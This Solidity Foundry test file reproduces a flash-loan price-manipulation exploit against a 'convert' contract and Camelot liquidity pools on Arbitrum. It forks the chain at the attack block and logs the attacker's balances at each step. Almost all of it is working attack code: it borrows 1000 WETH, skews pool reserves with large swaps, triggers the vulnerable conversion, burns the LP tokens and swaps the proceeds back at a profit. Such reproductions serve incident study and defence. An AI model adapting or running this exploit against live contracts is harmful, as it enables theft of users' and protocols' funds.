// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/phalcon_xyz/status/1686654241111429120?s=46&t=Oc_WAGUoXqc9c0LidD-zww
// @TX
// https://explorer.phalcon.xyz/tx/arbitrum/0x6301d4c9f7ac1c96a65e83be6ea2fff5000f0b1939ad24955e40890bd9fe6122

interface IVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) external pure returns (uint256 amountB);
}

interface ICamelotRouter is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        address referrer,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        address referrer,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        address referrer,
        uint256 deadline
    ) external;
}

interface ICamelotFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint256);

    function owner() external view returns (address);

    function feePercentOwner() external view returns (address);

    function setStableOwner() external view returns (address);

    function feeTo() external view returns (address);

    function ownerFeeShare() external view returns (uint256);

    function referrersFeeShare(address) external view returns (uint256);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;

    function feeInfo() external view returns (uint256 _ownerFeeShare, address _feeTo);
}

interface ICamelotPair {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint16 token0feePercent, uint16 token1FeePercent);

    function getAmountOut(uint256 amountIn, address tokenIn) external view returns (uint256);

    function kLast() external view returns (uint256);

    function setFeePercent(uint16 token0FeePercent, uint16 token1FeePercent) external;

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to) external returns (uint256 amount0, uint256 amount1);

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data, address referrer) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IConvert {
    function convert(uint256 _amount) external;
}

contract CounterTest is Test {
    IVault valut = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 NEU = IERC20(0xdA51015b73cE11F77A115Bb1b8a7049e02dDEcf0);
    IERC20 NEU1 = IERC20(0x6609BE1547166D1C4605F3A243FDCFf467e600C3);
    ICamelotRouter CamelotRouter = ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);
    IConvert convert = IConvert(0xdbd3d6040f87A9F822839Cb31195Ad25C2D0D54d);
    ICamelotPair CamelotPair0 = ICamelotPair(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440);
    ICamelotPair CamelotPair1 = ICamelotPair(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4);

    function setUp() public {
        vm.createSelectFork("arbitrum", 117_189_138);
        vm.label(address(WETH), "WETH");
        vm.label(address(NEU), "NEU");
    }

    function test() public {
        console.log("Attacker's WETH token balance: ", WETH.balanceOf(address(this)));
        IERC20[] memory tokens = new IERC20[](1);
        uint256[] memory amount = new uint[](1);
        tokens[0] = WETH;
        amount[0] = 1000 ether;
        bytes memory userdata;
        valut.flashLoan(IFlashLoanRecipient(address(this)), tokens, amount, userdata);
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        console.log("After flashloan attacker's WETH token balance: ", WETH.balanceOf(address(this)));
        WETH.approve(address(CamelotRouter), type(uint256).max);
        ICamelotFactory factoryAddr = ICamelotFactory(CamelotRouter.factory());
        console.log("Factory Address: ", address(factoryAddr));
        CamelotPair0 = ICamelotPair(factoryAddr.getPair(address(WETH), address(NEU)));
        console.log("CMLT-LP0 addresss: ", address(CamelotPair0));
        console.log("CMLT-LP0 addresss: ", factoryAddr.getPair(address(WETH), address(NEU)));
        address tokenA = CamelotPair0.token0();
        address tokenB = CamelotPair0.token1();
        address[] memory path = new address[](2);
        path[0] = tokenA;
        path[1] = tokenB;
        CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0.15 ether, 0, path, address(this), address(this), block.timestamp + 30 minutes
        );
        console.log("swap token [WETH,NEU] 0.15 WETH -> NEU");
        uint256 neuAmount = NEU.balanceOf(address(this));
        console.log("Attacker's NEU token balance: ", neuAmount);
        NEU.approve(address(CamelotRouter), neuAmount);
        uint256 lpAmount0 = CamelotPair0.balanceOf(address(this));
        console.log("Balance of Attacker in CMLT-LP0: ", lpAmount0);
        CamelotRouter.addLiquidity(
            tokenA, tokenB, 0.15 ether, neuAmount, 0, 0, address(this), block.timestamp + 30 minutes
        );
        lpAmount0 = CamelotPair0.balanceOf(address(this));
        console.log("Balance of Attacker in CMLT-LP0 after addLiquidity: ", lpAmount0);
        CamelotPair0.approve(address(convert), type(uint256).max);
        uint256 cvAmount = CamelotPair1.balanceOf(address(convert));
        console.log("Balance of Convert in CMLT-LP1: ", cvAmount);
        (uint256 lp0_reserve0, uint256 lp0_reserve1,,) = CamelotPair0.getReserves();
        console.log("LP0 reserve0 amount: ", lp0_reserve0);
        console.log("LP0 reserve1 amount: ", lp0_reserve1);
        (uint256 lp1_reserve0, uint256 lp1_reserve1,,) = CamelotPair1.getReserves();
        console.log("LP1 reserve0 amount: ", lp1_reserve0);
        console.log("LP1 reserve1 amount: ", lp1_reserve1);
        uint256 lp0_totalsupply = CamelotPair0.totalSupply();
        console.log("LP0 totalSupply amount: ", lp0_totalsupply);
        uint256 lp1_totalsupply = CamelotPair1.totalSupply();
        console.log("LP1 totalSupply amount: ", lp1_totalsupply);
        neuAmount = NEU.balanceOf(address(this));
        console.log("Attacker's NEU token balance: ", neuAmount);
        CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            849 ether, 0, path, address(this), address(this), block.timestamp + 30 minutes
        );
        console.log("swap token [WETH,NEU] 849 WETH -> NEU");
        neuAmount = NEU.balanceOf(address(this));
        console.log("Attacker's NEU token balance: ", neuAmount);
        uint256 wethAmount = WETH.balanceOf(address(this));
        console.log("Attacker's WETH token balance: ", wethAmount);
        (lp0_reserve0, lp0_reserve1,,) = CamelotPair0.getReserves();
        console.log("LP0 reserve0 amount: ", lp0_reserve0);
        console.log("LP0 reserve1 amount: ", lp0_reserve1);
        (lp1_reserve0, lp1_reserve1,,) = CamelotPair1.getReserves();
        console.log("LP1 reserve0 amount: ", lp1_reserve0);
        console.log("LP1 reserve1 amount: ", lp1_reserve1);
        convert.convert(lpAmount0);
        console.log("call the convert");
        neuAmount = NEU.balanceOf(address(this));
        console.log("Attacker's NEU token balance: ", neuAmount);
        wethAmount = WETH.balanceOf(address(this));
        console.log("Attacker's WETH token balance: ", wethAmount);
        NEU.approve(address(CamelotRouter), type(uint256).max);
        address[] memory path1 = new address[](2);
        path1[0] = tokenB;
        path1[1] = tokenA;
        CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            neuAmount, 0, path1, address(this), address(this), block.timestamp + 30 minutes
        );
        console.log("swap token [NEU,WETH]");
        wethAmount = WETH.balanceOf(address(this));
        console.log("Attacker's WETH token balance: ", wethAmount);
        uint256 lpAmount1 = CamelotPair1.balanceOf(address(this));
        console.log("Balance of Attacker in CMLT-LP1: ", lpAmount1);
        CamelotPair1.transfer(address(CamelotPair1), lpAmount1);
        (uint256 amount0, uint256 amount1) = CamelotPair1.burn(address(this));
        console.log("CMLT-LP1 burn amount: ", amount0, amount1);
        uint256 neu1Amount = NEU1.balanceOf(address(this));
        console.log("Attacker's NEU1 token balance: ", neu1Amount);
        wethAmount = WETH.balanceOf(address(this));
        console.log("Attacker's WETH token balance: ", wethAmount);
        address[] memory path2 = new address[](2);
        path2[0] = address(NEU1);
        path2[1] = address(WETH);
        NEU1.approve(address(CamelotRouter), type(uint256).max);
        CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            neu1Amount, 0, path2, address(this), address(this), block.timestamp + 30 minutes
        );
        console.log("swap token [NEU1,WETH]");
        wethAmount = WETH.balanceOf(address(this));
        console.log("Attacker's WETH token balance: ", wethAmount);
        (lp0_reserve0, lp0_reserve1,,) = CamelotPair0.getReserves();
        console.log("LP0 reserve0 amount: ", lp0_reserve0);
        console.log("LP0 reserve1 amount: ", lp0_reserve1);
        (lp1_reserve0, lp1_reserve1,,) = CamelotPair1.getReserves();
        console.log("LP1 reserve0 amount: ", lp1_reserve0);
        console.log("LP1 reserve1 amount: ", lp1_reserve1);
        WETH.transfer(address(valut), 1000 ether);
        console.log("refund flashloan");
        wethAmount = WETH.balanceOf(address(this));
        console.log("Attacker's WETH token balance: ", wethAmount);
    }
}
